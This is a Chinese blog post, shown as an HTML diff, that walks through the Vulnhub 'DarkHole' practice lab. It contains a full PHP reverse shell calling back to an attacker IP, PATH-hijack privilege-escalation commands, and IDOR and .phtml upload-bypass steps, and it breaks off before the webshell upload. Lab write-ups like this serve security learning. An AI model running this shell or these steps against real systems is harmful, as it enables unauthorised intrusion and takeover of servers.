@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mosquito.top","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.11.1","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="vlunhub-darkhole 靶场（简单-提权）首先是遇到的问题本次靶场带来了许多新知识点1）反弹shell (php-reverse-shell)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phpset_time_limit (0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vlunhub-darkhole靶场">
+<meta property="og:url" content="http://mosquito.top/2022/11/06/15-57-44/index.html">
+<meta property="og:site_name" content="mosquito的博客">
+<meta property="og:description" content="vlunhub-darkhole 靶场（简单-提权）首先是遇到的问题本次靶场带来了许多新知识点1）反弹shell (php-reverse-shell)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phpset_time_limit (0">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/QQ%E5%9B%BE%E7%89%8720221106161918.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%871.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%872.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%873.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%874.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%876.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%877.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%878.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%879.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8710.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8711.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8712.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8713.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8714.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8715.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8716.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221106182157.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8717.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8718.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8719.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8720.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8721.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8722.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/%E7%B2%89%E5%A2%A9%E5%AD%90.gif">
+<meta property="article:published_time" content="2022-11-06T07:57:44.000Z">
+<meta property="article:modified_time" content="2022-11-06T11:16:01.485Z">
+<meta property="article:author" content="mosquito">
+<meta property="article:tag" content="靶场渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/QQ%E5%9B%BE%E7%89%8720221106161918.png">
+
+
+<link rel="canonical" href="http://mosquito.top/2022/11/06/15-57-44/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://mosquito.top/2022/11/06/15-57-44/","path":"2022/11/06/15-57-44/","title":"vlunhub-darkhole靶场"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vlunhub-darkhole靶场 | mosquito的博客</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">mosquito的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#vlunhub-darkhole-%E9%9D%B6%E5%9C%BA%EF%BC%88%E7%AE%80%E5%8D%95-%E6%8F%90%E6%9D%83%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">vlunhub-darkhole 靶场（简单-提权）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A6%96%E5%85%88%E6%98%AF%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">首先是遇到的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E6%AC%A1%E9%9D%B6%E5%9C%BA%E5%B8%A6%E6%9D%A5%E4%BA%86%E8%AE%B8%E5%A4%9A%E6%96%B0%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">2.1.</span> <span class="nav-text">本次靶场带来了许多新知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%EF%BC%89%E5%8F%8D%E5%BC%B9shell-php-reverse-shell"><span class="nav-number">2.1.1.</span> <span class="nav-text">1）反弹shell (php-reverse-shell)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A3%9F%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">食用方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%8F%90%E6%9D%83"><span class="nav-number">2.2.</span> <span class="nav-text">2)提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1"><span class="nav-number">2.2.1.</span> <span class="nav-text">第一次</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83-joho%E6%8F%90%E6%9D%83"><span class="nav-number">2.2.2.</span> <span class="nav-text">环境变量提权(joho提权)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#root%E6%8F%90%E6%9D%83"><span class="nav-number">2.2.3.</span> <span class="nav-text">root提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%80%81%E8%A7%84%E7%9F%A9-%E6%9F%A5%E7%9C%8B%E9%9D%B6%E6%9C%BAIP%E5%9C%B0%E5%9D%80"><span class="nav-number">3.1.</span> <span class="nav-text">1.老规矩,查看靶机IP地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-nmap-A%E8%BF%9B%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%80%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.2.</span> <span class="nav-text">2.nmap -A进行系统性信息收集</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E7%A0%B4%E5%8F%A3%E6%BC%8F%E6%B4%9E-%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81"><span class="nav-number">4.</span> <span class="nav-text">网站破口漏洞:越权修改密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%B5%8B%E8%AF%95%E8%B4%A6%E6%88%B7%E4%BF%AE%E6%94%B9admin%E8%B4%A6%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E5%90%8E"><span class="nav-number">4.0.1.</span> <span class="nav-text">使用测试账户修改admin账户的密码后</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">4.0.2.</span> <span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%9A%81%E5%89%91%E9%93%BE%E6%8E%A5"><span class="nav-number">4.0.3.</span> <span class="nav-text">使用蚁剑链接</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">5.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%831-%E5%A4%B1%E8%B4%A5"><span class="nav-number">5.1.</span> <span class="nav-text">提权1:失败</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8mknod%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="nav-number">5.1.1.</span> <span class="nav-text">使用mknod命令提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%832-%E6%88%90%E5%8A%9F"><span class="nav-number">6.</span> <span class="nav-text">提权2:成功</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php-reverse-shell"><span class="nav-number">6.1.</span> <span class="nav-text">php-reverse-shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83-%E5%A4%B1%E8%B4%A5"><span class="nav-number">6.2.</span> <span class="nav-text">环境变量提权(失败)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83-%E6%88%90%E5%8A%9F"><span class="nav-number">6.3.</span> <span class="nav-text">另一种环境变量提权(成功)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#root%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F"><span class="nav-number">7.</span> <span class="nav-text">root提权成功</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%88%90%E5%8A%9F"><span class="nav-number">8.</span> <span class="nav-text">成功!</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">9.</span> <span class="nav-text">总结:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E7%9C%8B%E5%B8%B8%E6%96%B0-%E5%A4%9A%E5%A4%9A%E5%AD%A6%E4%B9%A0"><span class="nav-number">10.</span> <span class="nav-text">常看常新!多多学习~</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="mosquito"
+      src="/images/android-chrome-256x256.png">
+  <p class="site-author-name" itemprop="name">mosquito</p>
+  <div class="site-description" itemprop="description">学海无涯苦作舟</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://mosquito.top/2022/11/06/15-57-44/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/android-chrome-256x256.png">
+      <meta itemprop="name" content="mosquito">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mosquito的博客">
+      <meta itemprop="description" content="学海无涯苦作舟">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vlunhub-darkhole靶场 | mosquito的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vlunhub-darkhole靶场
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-11-06 15:57:44 / 修改时间：19:16:01" itemprop="dateCreated datePublished" datetime="2022-11-06T15:57:44+08:00">2022-11-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="vlunhub-darkhole-靶场（简单-提权）"><a href="#vlunhub-darkhole-靶场（简单-提权）" class="headerlink" title="vlunhub-darkhole 靶场（简单-提权）"></a>vlunhub-darkhole 靶场（简单-提权）</h1><h1 id="首先是遇到的问题"><a href="#首先是遇到的问题" class="headerlink" title="首先是遇到的问题"></a>首先是遇到的问题</h1><h2 id="本次靶场带来了许多新知识点"><a href="#本次靶场带来了许多新知识点" class="headerlink" title="本次靶场带来了许多新知识点"></a>本次靶场带来了许多新知识点</h2><h3 id="1）反弹shell-php-reverse-shell"><a href="#1）反弹shell-php-reverse-shell" class="headerlink" title="1）反弹shell (php-reverse-shell)"></a>1）反弹shell (php-reverse-shell)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">set_time_limit (0);</span><br><span class="line">$ip = &quot;192.168.50.131&quot;;</span><br><span class="line">$port = &quot;8888&quot;;</span><br><span class="line"> </span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span><br><span class="line">if (!$sock) </span><br><span class="line">	exit(&quot;$errstr ($errno)&quot;);</span><br><span class="line"> </span><br><span class="line">if(function_exists(&#x27;proc_open&#x27;))&#123;</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  </span><br><span class="line">   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  </span><br><span class="line">   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)  </span><br><span class="line">);</span><br><span class="line">$process = proc_open(&quot;id;/bin/sh -i&quot;, $descriptorspec, $pipes);</span><br><span class="line">if (!is_resource($process)) </span><br><span class="line">	exit(&quot;ERROR: Can&#x27;t reverse shell&quot;);</span><br><span class="line"> </span><br><span class="line">stream_set_blocking($pipes[0], 0);</span><br><span class="line">stream_set_blocking($pipes[1], 0);</span><br><span class="line">stream_set_blocking($pipes[2], 0);</span><br><span class="line">stream_set_blocking($sock, 0);</span><br><span class="line">	</span><br><span class="line">print(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span><br><span class="line"> </span><br><span class="line">while (1) &#123;</span><br><span class="line">	if (feof($sock)) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell connection terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	if (feof($pipes[1])) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell process terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$input = fread($sock, 1024);</span><br><span class="line">	fwrite($pipes[0], $input);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[1], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[2], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">&#125;	</span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[0]);</span><br><span class="line">fclose($pipes[1]);</span><br><span class="line">fclose($pipes[2]);</span><br><span class="line">proc_close($process);</span><br><span class="line">&#125;</span><br><span class="line">else print &quot;function &#x27;proc_open&#x27; is not exists.&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="食用方法"><a href="#食用方法" class="headerlink" title="食用方法"></a>食用方法</h4><p>新建php文件,将此代码复制粘贴进去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ip = &quot;192.168.50.131&quot;;</span><br><span class="line">$port = &quot;8888&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>修改上述ip和端口</p>
+<p>ip为攻击机ip,端口自定</p>
+<p>我的为kali系统,所以IP为kali的IP地址,端口为卡里 nc -lvvp “端口”</p>
+<h2 id="2-提权"><a href="#2-提权" class="headerlink" title="2)提权"></a>2)提权</h2><p>在本靶机里涉及到三次提权,后文会依次说明</p>
+<h3 id="第一次"><a href="#第一次" class="headerlink" title="第一次"></a>第一次</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty as pt;pt.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="环境变量提权-joho提权"><a href="#环境变量提权-joho提权" class="headerlink" title="环境变量提权(joho提权)"></a>环境变量提权(joho提权)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;bash&#x27; &gt; /tmp/id;chmod +x /tmp/id; export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="root提权"><a href="#root提权" class="headerlink" title="root提权"></a>root提权</h3><p>在该方式下 chmod 777 id 的解释:</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rjszz1314/article/details/104399333">chmod 777 到底是啥 ???看完这个你就完全懂了！_人间世庄子的博客-CSDN博客_chmod777</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp   // 回到tmp目录</span><br><span class="line">touch id   //创建假的id命令文件</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; id//id文件中写入/bin/bash 字段，生成一个shell</span><br><span class="line">chmod 777 id    //赋予id全文件权限</span><br><span class="line">export PATH=/tmp:$PATH //设置环境变量</span><br><span class="line">cd /home/john</span><br><span class="line">./toto</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangxueying5172/article/details/121552506"> DARKHOLE_1攻略_knight11112的博客-CSDN博客</a></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="1-老规矩-查看靶机IP地址"><a href="#1-老规矩-查看靶机IP地址" class="headerlink" title="1.老规矩,查看靶机IP地址"></a>1.老规矩,查看靶机IP地址</h2><p>使用netdiscover -r 192.168.50.1/24 探测靶机IP地址</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E5%9B%BE%E7%89%8720221106161918.png"></p>
+<p>192.168.50.133</p>
+<h2 id="2-nmap-A进行系统性信息收集"><a href="#2-nmap-A进行系统性信息收集" class="headerlink" title="2.nmap -A进行系统性信息收集"></a>2.nmap -A进行系统性信息收集</h2><p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%871.png"></p>
+<p>可以发现靶机开放了80端口和22端口,ssh服务开放</p>
+<p>nmap中无法获得更近一步的信息,</p>
+<h1 id="网站破口漏洞-越权修改密码"><a href="#网站破口漏洞-越权修改密码" class="headerlink" title="网站破口漏洞:越权修改密码"></a>网站破口漏洞:越权修改密码</h1><p>访问192.168.50.133的80端口</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%872.png"></p>
+<p>看到一个登录口,可以测试弱口令,sql注入等</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%873.png"></p>
+<p>前期我们已经通过注册账户测试知道该后台已存在admin账户</p>
+<p>在此我们注册测试账户:test/test</p>
+<p>通过测试账户登录后,后台界面普通账户只有修改账户密码的功能</p>
+<p>使用burp suite抓包</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%874.png"></p>
+<p>如图所标注,该账号是我测试所注册的第三个账号,推测该后台存在一个id=1的admin账户,前期测试时以确定可以通过修改提交信息中的id值可以修改对应id的账户密码.</p>
+<h3 id="使用测试账户修改admin账户的密码后"><a href="#使用测试账户修改admin账户的密码后" class="headerlink" title="使用测试账户修改admin账户的密码后"></a>使用测试账户修改admin账户的密码后</h3><p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%876.png"></p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>该管理员账户可以远程上传文件,所以我们可以尝试上传木马文件留下我们的后门.</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%877.png"></p>
+<p>发现有文件后缀名检测,但没有检测我们的文件内容,尝试后缀名绕过,</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%878.png"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%879.png"></p>
+<p>测试一圈后发现该后台进行了文件上传的限制有点大,(遇到的情况太少,经验不足以解决.)查找攻略后发现phtml后缀的php代码文件可以上传,可以执行</p>
+<p>先上传一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码执行成功</p>
+<p><img src="/imgs/$%7Bfiilename%7D/%E5%9B%BE%E7%89%8710.png"></p>
+<p>那就可以上传我们的小马了</p>
